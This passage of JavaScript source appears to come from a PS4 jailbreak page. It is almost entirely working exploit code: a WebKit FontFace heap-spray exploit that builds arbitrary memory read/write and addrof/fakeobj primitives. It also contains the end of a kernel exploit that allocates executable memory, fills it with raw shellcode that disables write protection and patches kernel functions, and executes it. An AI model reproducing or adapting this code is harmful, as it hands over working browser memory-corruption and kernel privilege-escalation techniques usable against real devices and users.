      "\n\n⚠⚠⚠ Emulating exfathax USB ⚠⚠⚠\nClick OK when the 'USB unsupported' popup notification has gone."
    );
    CallCgi("unload_mass_storage");

    for (var i = 1; i < NUM_KQUEUES; i += 2)
      chain.fcall(window.syscalls[6], kqueues[i]);
    chain.run();

    if (chain.syscall(23, 0).low == 0) {
      chain.fcall(window.syscalls[73], 0x4000, 0xc000);
      chain.fcall(window.syscalls[325]);
      var patch_buffer = chain.syscall(
        477,
        0x0,
        0x4000,
        0x7,
        0x1000,
        0xffffffff,
        0
      );
      var PBV = p.array_from_address(patch_buffer, 0x1000);
      PBV[0] = 0x00000bb8;
      PBV[1] = 0xfe894800;
      PBV[2] = 0x033d8d48;
      PBV[3] = 0x0f000000;
      PBV[4] = 0x4855c305;
      PBV[5] = 0x8b48e589;
      PBV[6] = 0x95e8087e;
      PBV[7] = 0xe8000000;
      PBV[8] = 0x00000175;
      PBV[9] = 0x033615ff;
      PBV[10] = 0x8b480000;
      PBV[11] = 0x0003373d;
      PBV[12] = 0x3f8b4800;
      PBV[13] = 0x74ff8548;
      PBV[14] = 0x3d8d48eb;
      PBV[15] = 0x0000029d;
      PBV[16] = 0xf9358b48;
      PBV[17] = 0x48000002;
      PBV[18] = 0x0322158b;
      PBV[19] = 0x8b480000;
      PBV[20] = 0x00d6e812;
      PBV[21] = 0x8d480000;
      PBV[22] = 0x00029f3d;
      PBV[23] = 0x358b4800;
      PBV[24] = 0x000002e4;
      PBV[25] = 0x05158b48;
      PBV[26] = 0x48000003;
      PBV[27] = 0xb9e8128b;
      PBV[28] = 0x48000000;
      PBV[29] = 0x02633d8d;
      PBV[30] = 0x8b480000;
      PBV[31] = 0x0002bf35;
      PBV[32] = 0x158b4800;
      PBV[33] = 0x000002c8;
      PBV[34] = 0xe8128b48;
      PBV[35] = 0x0000009c;
      PBV[36] = 0x7a3d8d48;
      PBV[37] = 0x48000002;
      PBV[38] = 0x02aa358b;
      PBV[39] = 0x8b480000;
      PBV[40] = 0x0002ab15;
      PBV[41] = 0x128b4800;
      PBV[42] = 0x00007fe8;
      PBV[43] = 0x0185e800;
      PBV[44] = 0xc35d0000;
      PBV[45] = 0x6d3d8948;
      PBV[46] = 0x48000002;
      PBV[47] = 0x026e3d01;
      PBV[48] = 0x01480000;
      PBV[49] = 0x00026f3d;
      PBV[50] = 0x3d014800;
      PBV[51] = 0x00000270;
      PBV[52] = 0x713d0148;
      PBV[53] = 0x48000002;
      PBV[54] = 0x02723d01;
      PBV[55] = 0x01480000;
      PBV[56] = 0x0002933d;
      PBV[57] = 0x3d014800;
      PBV[58] = 0x00000294;
      PBV[59] = 0x653d0148;
      PBV[60] = 0x48000002;
      PBV[61] = 0x02663d01;
      PBV[62] = 0x01480000;
      PBV[63] = 0x0002873d;
      PBV[64] = 0x3d014800;
      PBV[65] = 0x00000288;
      PBV[66] = 0x893d0148;
      PBV[67] = 0x48000002;
      PBV[68] = 0x028a3d01;
      PBV[69] = 0x01480000;
      PBV[70] = 0x00028b3d;
      PBV[71] = 0x3d014800;
      PBV[72] = 0x0000024c;
      PBV[73] = 0x3d3d0148;
      PBV[74] = 0xc3000002;
      PBV[75] = 0xe5894855;
      PBV[76] = 0x10ec8348;
      PBV[77] = 0x24348948;
      PBV[78] = 0x24548948;
      PBV[79] = 0xed15ff08;
      PBV[80] = 0x48000001;
      PBV[81] = 0x4b74c085;
      PBV[82] = 0x48c28948;
      PBV[83] = 0x4840408b;
      PBV[84] = 0x2f74c085;
      PBV[85] = 0x28788b48;
      PBV[86] = 0x243c3b48;
      PBV[87] = 0x8b480a74;
      PBV[88] = 0xc0854800;
      PBV[89] = 0xeceb1d74;
      PBV[90] = 0x18788b48;
      PBV[91] = 0x74ff8548;
      PBV[92] = 0x7f8b48ed;
      PBV[93] = 0x7c3b4810;
      PBV[94] = 0xe2750824;
      PBV[95] = 0xff1040c7;
      PBV[96] = 0x48ffffff;
      PBV[97] = 0x31107a8d;
      PBV[98] = 0x31d231f6;
      PBV[99] = 0xa515ffc9;
      PBV[100] = 0x48000001;
      PBV[101] = 0x5d10c483;
      PBV[102] = 0x894855c3;
      PBV[103] = 0xc0200fe5;
      PBV[104] = 0xffff2548;
      PBV[105] = 0x220ffffe;
      PBV[106] = 0x3d8b48c0;
      PBV[107] = 0x000001c8;
      PBV[108] = 0x909007c7;
      PBV[109] = 0x47c79090;
      PBV[110] = 0x48909004;
      PBV[111] = 0x358b48b8;
      PBV[112] = 0x000001ac;
      PBV[113] = 0x08778948;
      PBV[114] = 0x651047c7;
      PBV[115] = 0xc73c8b48;
      PBV[116] = 0x00251447;
      PBV[117] = 0x47c70000;
      PBV[118] = 0x89480018;
      PBV[119] = 0x1c47c738;
      PBV[120] = 0xb8489090;
      PBV[121] = 0x7d358b48;
      PBV[122] = 0x48000001;
      PBV[123] = 0xc7207789;
      PBV[124] = 0xc7482847;
      PBV[125] = 0x47c70100;
      PBV[126] = 0x0000002c;
      PBV[127] = 0x778d48e9;
      PBV[128] = 0x158b4834;
      PBV[129] = 0x00000150;
      PBV[130] = 0x89f22948;
      PBV[131] = 0x8b483057;
      PBV[132] = 0x00016b35;
      PBV[133] = 0x568d4800;
      PBV[134] = 0xd7294805;
      PBV[135] = 0xc148ff89;
      PBV[136] = 0x814808e7;
      PBV[137] = 0x0000e9cf;
      PBV[138] = 0x3e894800;
      PBV[139] = 0x00000d48;
      PBV[140] = 0x220f0001;
      PBV[141] = 0x55c35dc0;
      PBV[142] = 0x0fe58948;
      PBV[143] = 0x2548c020;
      PBV[144] = 0xfffeffff;
      PBV[145] = 0x48c0220f;
      PBV[146] = 0x013a3d8b;
      PBV[147] = 0x07c70000;
      PBV[148] = 0x00c3c031;
      PBV[149] = 0x353d8b48;
      PBV[150] = 0xc7000001;
      PBV[151] = 0xc3c03107;
      PBV[152] = 0x3d8b4800;
      PBV[153] = 0x00000130;
      PBV[154] = 0xc03107c7;
      PBV[155] = 0x8b4800c3;
      PBV[156] = 0x00012b3d;
      PBV[157] = 0x3107c700;
      PBV[158] = 0x4800c3c0;
      PBV[159] = 0x00a63d8b;
      PBV[160] = 0x87c70000;
      PBV[161] = 0x001f1e01;
      PBV[162] = 0x9090f631;
      PBV[163] = 0x1e0587c7;
      PBV[164] = 0xc931001f;
      PBV[165] = 0x87c79090;
      PBV[166] = 0x001f1e09;
      PBV[167] = 0x9090d231;
      PBV[168] = 0x1e3e87c7;
      PBV[169] = 0xc931001f;
      PBV[170] = 0x0d489090;
      PBV[171] = 0x00010000;
      PBV[172] = 0xffc0220f;
      PBV[173] = 0x0000ef15;
      PBV[174] = 0xc0200f00;
      PBV[175] = 0xffff2548;
      PBV[176] = 0x220ffffe;
      PBV[177] = 0x3d8b48c0;
      PBV[178] = 0x000000dc;
      PBV[179] = 0xc03107c7;
      PBV[180] = 0x0d4800c3;
      PBV[181] = 0x00010000;
      PBV[182] = 0x5dc0220f;
      PBV[183] = 0x737973c3;
      PBV[184] = 0x5f6d6574;
      PBV[185] = 0x70737573;
      PBV[186] = 0x5f646e65;
      PBV[187] = 0x73616870;
      PBV[188] = 0x705f3265;
      PBV[189] = 0x735f6572;
      PBV[190] = 0x00636e79;
      PBV[191] = 0x74737973;
      PBV[192] = 0x725f6d65;
      PBV[193] = 0x6d757365;
      PBV[194] = 0x68705f65;
      PBV[195] = 0x32657361;
      PBV[196] = 0x73797300;
      PBV[197] = 0x5f6d6574;
      PBV[198] = 0x75736572;
      PBV[199] = 0x705f656d;
      PBV[200] = 0x65736168;
      PBV[201] = 0x90900033;
      PBV[202] = 0x00000000;
      PBV[203] = 0x00000000;
      PBV[204] = 0x000f88f0;
      PBV[205] = 0x00000000;
      PBV[206] = 0x002ef170;
      PBV[207] = 0x00000000;
      PBV[208] = 0x00018df0;
      PBV[209] = 0x00000000;
      PBV[210] = 0x00018ef0;
      PBV[211] = 0x00000000;
      PBV[212] = 0x02654110;
      PBV[213] = 0x00000000;
      PBV[214] = 0x00097230;
      PBV[215] = 0x00000000;
      PBV[216] = 0x00402e60;
      PBV[217] = 0x00000000;
      PBV[218] = 0x01520108;
      PBV[219] = 0x00000000;
      PBV[220] = 0x01520100;
      PBV[221] = 0x00000000;
      PBV[222] = 0x00462d20;
      PBV[223] = 0x00000000;
      PBV[224] = 0x00462dfc;
      PBV[225] = 0x00000000;
      PBV[226] = 0x006259a0;
      PBV[227] = 0x00000000;
      PBV[228] = 0x006268d0;
      PBV[229] = 0x00000000;
      PBV[230] = 0x00625dc0;
      PBV[231] = 0x00000000;
      PBV[232] = 0x00626290;
      PBV[233] = 0x00000000;
      PBV[234] = 0x00626720;
      PBV[235] = 0x00000000;
      chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
      chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
      chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
      chain.run();
      return true;
    }
    alert("Kernel Exploit Failed! Reboot and Try Again.");
    // p.write8(0, 0);
    return false;
  };

  function runKEX() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    return trigger_spray();
  }
  return runKEX();
}

function webkitExploit() {
  StartTimer();
  var PAGE_SIZE = 16384;
  var SIZEOF_CSS_FONT_FACE = 0xb8;
  var HASHMAP_BUCKET = 208;
  var STRING_OFFSET = 20;
  var SPRAY_FONTS = 0x100a;
  var GUESS_FONT = 0x200430000;
  var NPAGES = 20;
  var INVALID_POINTER = 0;
  var HAMMER_FONT_NAME = "font8";
  var HAMMER_NSTRINGS = 700;
  var union = new ArrayBuffer(8);
  var union_b = new Uint8Array(union);
  var union_i = new Uint32Array(union);
  var union_f = new Float64Array(union);
  var bad_fonts = [];
  for (var i = 0; i < SPRAY_FONTS; i++)
    bad_fonts.push(new FontFace("font1", "", {}));
  var good_font = new FontFace("font2", "url(data:text/html,)", {});
  bad_fonts.push(good_font);
  var arrays = [];
  for (var i = 0; i < 512; i++) arrays.push(new Array(31));
  arrays[256][0] = 1.5;
  arrays[257][0] = {};
  arrays[258][0] = 1.5;
  var jsvalue = {
    a: arrays[256],
    b: new Uint32Array(1),
    c: true,
  };
  var string_atomifier = {};
  var string_id = 10000000;
  function ptrToString(p) {
    var s = "";
    for (var i = 0; i < 8; i++) {
      s += String.fromCharCode(p % 256);
      p = (p - (p % 256)) / 256;
    }
    return s;
  }
  function stringToPtr(p, o) {
    if (o === undefined) o = 0;
    var ans = 0;
    for (var i = 7; i >= 0; i--) ans = 256 * ans + p.charCodeAt(o + i);
    return ans;
  }
  var strings = [];
  function mkString(l, head) {
    var s =
      head + "\u0000".repeat(l - STRING_OFFSET - 8 - head.length) + string_id++;
    string_atomifier[s] = 1;
    strings.push(s);
    return s;
  }
  var guf = GUESS_FONT;
  var ite = true;
  var matches = 0;
  var round = 0;
  window.ffses = {};
  do {
    var p_s = ptrToString(NPAGES + 2);
    for (var i = 0; i < NPAGES; i++) p_s += ptrToString(guf + i * PAGE_SIZE);
    p_s += ptrToString(INVALID_POINTER);
    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
    var ffs = (ffses["search_" + ++round] = new FontFaceSet(bad_fonts));
    var badstr1 = mkString(HASHMAP_BUCKET, p_s);
    var guessed_font = null;
    var guessed_addr = null;
    for (var i = 0; i < SPRAY_FONTS; i++) {
      bad_fonts[i].family = "search" + round;
      if (badstr1.substr(0, p_s.length) != p_s) {
        guessed_font = i;
        var p_s1 = badstr1.substr(0, p_s.length);
        for (var i = 1; i <= NPAGES; i++) {
          if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
            guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
            break;
          }
        }
        if (matches++ == 0) {
          guf = guessed_addr + 2 * PAGE_SIZE;
          guessed_addr = null;
        }
        break;
      }
    }
    if ((ite = !ite)) guf += NPAGES * PAGE_SIZE;
  } while (guessed_addr === null);
  var p_s = "";
  p_s += ptrToString(26);
  p_s += ptrToString(guessed_addr);
  p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
  for (var i = 0; i < 19; i++) p_s += ptrToString(INVALID_POINTER);
  for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
  var needfix = [];
  for (var i = 0; ; i++) {
    ffses["ffs_leak_" + i] = new FontFaceSet([
      bad_fonts[guessed_font],
      bad_fonts[guessed_font + 1],
      good_font,
    ]);
    var badstr2 = mkString(HASHMAP_BUCKET, p_s);
    needfix.push(mkString(HASHMAP_BUCKET, p_s));
    bad_fonts[guessed_font].family = "evil2";
    bad_fonts[guessed_font + 1].family = "evil3";
    var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
    if (leak < 0x1000000000000) break;
  }
  function makeReader(read_addr, ffs_name) {
    var fake_s = "";
    fake_s += "0000";
    fake_s += "\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff";
    fake_s += ptrToString(read_addr);
    fake_s += ptrToString(0x80000014);
    p_s = "";
    p_s += ptrToString(29);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 18; i++) p_s += ptrToString(INVALID_POINTER);
    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
    var the_ffs = (ffses[ffs_name] = new FontFaceSet([
      bad_fonts[guessed_font],
      bad_fonts[guessed_font + 1],
      bad_fonts[guessed_font + 2],
      good_font,
    ]));
    mkString(HASHMAP_BUCKET, p_s);
    var relative_read = mkString(HASHMAP_BUCKET, fake_s);
    bad_fonts[guessed_font].family = ffs_name + "_evil1";
    bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
    bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
    needfix.push(relative_read);
    if (relative_read.length < 1000)
      return makeReader(read_addr, ffs_name + "_");
    return relative_read;
  }
  var fastmalloc = makeReader(leak, "ffs3");
  for (var i = 0; i < 100000; i++) mkString(128, "");
  var props = [];
  for (var i = 0; i < 0x10000; i++) {
    props.push({
      value: 0x41434442,
    });
    props.push({
      value: jsvalue,
    });
  }
  var jsvalue_leak = null;
  while (jsvalue_leak === null) {
    Object.defineProperties({}, props);
    for (
      var i = fastmalloc.indexOf(
        "\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff"
      );
      ;
      i++
    ) {
      if (
        fastmalloc.charCodeAt(i) == 0x42 &&
        fastmalloc.charCodeAt(i + 1) == 0x44 &&
        fastmalloc.charCodeAt(i + 2) == 0x43 &&
        fastmalloc.charCodeAt(i + 3) == 0x41 &&
        fastmalloc.charCodeAt(i + 4) == 0 &&
        fastmalloc.charCodeAt(i + 5) == 0 &&
        fastmalloc.charCodeAt(i + 6) == 254 &&
        fastmalloc.charCodeAt(i + 7) == 255 &&
        fastmalloc.charCodeAt(i + 24) == 14
      ) {
        jsvalue_leak = stringToPtr(fastmalloc, i + 32);
        break;
      }
    }
  }
  var rd_leak = makeReader(jsvalue_leak, "ffs4");
  var array256 = stringToPtr(rd_leak, 16);
  var ui32a = stringToPtr(rd_leak, 24);
  var rd_arr = makeReader(array256, "ffs5");
  var butterfly = stringToPtr(rd_arr, 8);
  var rd_ui32 = makeReader(ui32a, "ffs6");
  for (var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);
  var structureid_low = union_i[0];
  var structureid_high = union_i[1];
  union_i[0] = 0x10000;
  union_i[1] = 0;
  arrays[257][1] = {};
  arrays[257][0] = union_f[0];
  union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
  union_i[1] = (guessed_addr - (guessed_addr % 0x100000000)) / 0x100000000;
  arrays[256][i] = union_f[0];
  pp_s = "";
  pp_s += ptrToString(56);
  for (var i = 0; i < 12; i++)
    pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
  var fake_s = "";
  fake_s += "0000";
  fake_s += ptrToString(INVALID_POINTER);
  fake_s += ptrToString(butterfly);
  fake_s += "\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000";
  var ffs7_args = [];
  for (var i = 0; i < 12; i++) ffs7_args.push(bad_fonts[guessed_font + i]);
  ffs7_args.push(good_font);
  var ffs8_args = [bad_fonts[guessed_font + 12]];
  for (var i = 0; i < 5; i++)
    ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
  for (var i = 0; i < HAMMER_NSTRINGS; i++) mkString(HASHMAP_BUCKET, pp_s);
  ffses.ffs7 = new FontFaceSet(ffs7_args);
  mkString(HASHMAP_BUCKET, pp_s);
  ffses.ffs8 = new FontFaceSet(ffs8_args);
  var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
  needfix.push(post_ffs);
  for (var i = 0; i < 13; i++)
    bad_fonts[guessed_font + i].family = "hammer" + i;
  function boot_addrof(obj) {
    arrays[257][32] = obj;
    union_f[0] = arrays[258][0];
    return union_i[1] * 0x100000000 + union_i[0];
  }
  function boot_fakeobj(addr) {
    union_i[0] = addr;
    union_i[1] = (addr - (addr % 0x100000000)) / 0x100000000;
    arrays[258][0] = union_f[0];
    return arrays[257][32];
  }
  var arw_master = new Uint32Array(8);
  var arw_slave = new Uint8Array(1);
  var obj_master = new Uint32Array(8);
  var obj_slave = {
    obj: null,
  };
  var addrof_slave = boot_addrof(arw_slave);
  var addrof_obj_slave = boot_addrof(obj_slave);
  union_i[0] = structureid_low;
  union_i[1] = structureid_high;
  union_b[6] = 7;
  var obj = {
    jscell: union_f[0],
    butterfly: true,
    buffer: arw_master,
    size: 0x5678,
  };
  function i48_put(x, a) {
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
  }
  function i48_get(a) {
    return a[4] + a[5] * 4294967296;
  }
  window.addrof = function (x) {
    obj_slave.obj = x;
    return i48_get(obj_master);
  };
  window.fakeobj = function (x) {
    i48_put(x, obj_master);
    return obj_slave.obj;
  };
  function read_mem_setup(p, sz) {
    i48_put(p, arw_master);
    arw_master[6] = sz;
  }
  window.read_mem = function (p, sz) {
    read_mem_setup(p, sz);
    var arr = [];
    for (var i = 0; i < sz; i++) arr.push(arw_slave[i]);
    return arr;
  };
  window.write_mem = function (p, data) {
    read_mem_setup(p, data.length);
    for (var i = 0; i < data.length; i++) arw_slave[i] = data[i];
  };
  window.read_ptr_at = function (p) {
    var ans = 0;
    var d = read_mem(p, 8);
    for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
    return ans;
  };
  window.write_ptr_at = function (p, d) {
    var arr = [];
    for (var i = 0; i < 8; i++) {
      arr.push(d & 0xff);
      d /= 256;
    }
    write_mem(p, arr);
  };
  (function () {
    var magic = boot_fakeobj(boot_addrof(obj) + 16);
    magic[4] = addrof_slave;
    magic[5] = (addrof_slave - (addrof_slave % 0x100000000)) / 0x100000000;
    obj.buffer = obj_master;
    magic[4] = addrof_obj_slave;
    magic[5] =
      (addrof_obj_slave - (addrof_obj_slave % 0x100000000)) / 0x100000000;
    magic = null;
  })();
  (function () {
    var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
    write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
    for (var i = 0; i < needfix.length; i++) {
      var addr = read_ptr_at(addrof(needfix[i]) + 8);
      write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
      write_ptr_at(addr + 8, addr + 20);
      write_ptr_at(addr + 16, 0x80000014);
    }
    write_ptr_at(butterfly + 248, 0x1f0000001f);
  })();
  var expl_master = new Uint32Array(8);
  var expl_slave = new Uint32Array(2);
  var addrof_expl_slave = addrof(expl_slave);
  var m = fakeobj(addrof(obj) + 16);
  obj.buffer = expl_slave;
  m[7] = 1;
  obj.buffer = expl_master;
  m[4] = addrof_expl_slave;
  m[5] = (addrof_expl_slave - (addrof_expl_slave % 0x100000000)) / 0x100000000;
  m[7] = 1;
  var prim = {
    write8: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      if (value instanceof int64) {
        expl_slave[0] = value.low;
        expl_slave[1] = value.hi;
      } else {
        expl_slave[0] = value;
        expl_slave[1] = 0;
      }
    },
    write4: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      if (value instanceof int64) {
        expl_slave[0] = value.low;
      } else {
        expl_slave[0] = value;
      }
    },
    write2: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      var tmp = expl_slave[0] & 0xffff0000;
      if (value instanceof int64) {
        expl_slave[0] = (value.low & 0xffff) | tmp;
      } else {
        expl_slave[0] = (value & 0xffff) | tmp;
      }
    },
    write1: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      var tmp = expl_slave[0] & 0xffffff00;
      if (value instanceof int64) {
        expl_slave[0] = (value.low & 0xff) | tmp;
      } else {
        expl_slave[0] = (value & 0xff) | tmp;
      }
    },
    read8: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return new int64(expl_slave[0], expl_slave[1]);
    },
    read4: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return expl_slave[0];
    },
    read2: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return expl_slave[0] & 0xffff;
    },
    read1: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return expl_slave[0] & 0xff;
    },
    leakval: function (obj) {
      obj_slave.obj = obj;
      return new int64(obj_master[4], obj_master[5]);
    },
  };
  EndTimer();
  window.p = prim;
  return run_hax();
}

function CallCgi(script) {
  var xmlHttpRequest = new XMLHttpRequest();
  // GET request is not working on PS4?
  xmlHttpRequest.open("POST", "/cgi-bin/" + script, true);
  xmlHttpRequest.send();
}
